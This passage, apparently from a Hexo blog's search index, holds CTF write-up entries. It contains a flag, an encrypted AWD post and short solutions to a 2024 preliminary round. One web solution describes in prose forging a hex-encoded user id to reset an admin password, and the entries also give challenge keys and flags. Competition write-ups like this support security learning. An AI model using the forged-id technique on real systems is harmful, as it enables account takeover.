alt="image-20241023161635764"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241023161648260.png" alt="image-20241023161648260"></p><p>YLCTF{e2bae51b981c707eb28302fe22d60340}</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Misc</tag>
      
      <tag>Web</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024领航杯 决赛AWD</title>
    <link href="/2024/10/29/2024%E9%A2%86%E8%88%AA%E6%9D%AF-%E5%86%B3%E8%B5%9BAWD/"/>
    <url>/2024/10/29/2024%E9%A2%86%E8%88%AA%E6%9D%AF-%E5%86%B3%E8%B5%9BAWD/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="7fea4ca95898e36549791924f5027a7a7a475b7c3459fa9a4e6d2fb31dc33c7d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>AWD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024领航杯本科组初赛</title>
    <link href="/2024/10/16/2024%E9%A2%86%E8%88%AA%E6%9D%AF%E6%9C%AC%E7%A7%91%E7%BB%84%E5%88%9D%E8%B5%9B/"/>
    <url>/2024/10/16/2024%E9%A2%86%E8%88%AA%E6%9D%AF%E6%9C%AC%E7%A7%91%E7%BB%84%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h4 id="1-Crypto-Rabbit"><a href="#1-Crypto-Rabbit" class="headerlink" title="1. Crypto-Rabbit"></a>1. Crypto-Rabbit</h4><p>   一血，爽</p><p>   Rabbit解密</p><p>   密码mulanshi</p><p>   <img src="../../../../img/archives/2024%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/87f78f791fef666c2cdc42856b0f157b.png"></p><p>   <img src="../../../../img/archives/2024%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/0ddb142aade8fd7503aff65de76b5bf9.png"></p><h4 id="2-Misc-seeme"><a href="#2-Misc-seeme" class="headerlink" title="2. Misc-seeme"></a>2. Misc-seeme</h4><p>   一血，爽，puzzlesolver秒了</p><p>   像素值转图片，旋转翻折</p><p>   <img src="../../../../img/archives/2024%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/4db90a478432e5e34fe19a323e67837d.png"></p><p>   <img src="../../../../img/archives/2024%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/d6e621cd307fb1758a27400b209d52c9.png"></p><p>   <img src="../../../../img/archives/2024%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/b96f2279ac197db163b93dd39a1df28b.png"></p><h4 id="3、Web-acxi"><a href="#3、Web-acxi" class="headerlink" title="3、Web-acxi"></a>3、Web-acxi</h4><p>   HEDDEN_HIX疑似提示转hex，登录登出几次发现hex中间内容不变怀疑是userid，改成0001转回去，重置admin密码为123456登录得到flag</p><p>   <img src="../../../../img/archives/2024%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/bf13dedf92d4eacde43e66942bab31fe.png"></p><p>   <img src="../../../../img/archives/2024%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/b037288133f9aacb519262ca1dfa2451.png"></p><p>   <img src="../../../../img/archives/2024%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/45d82f126dc379f7b0ecdb24bcabe1fe.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Misc</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
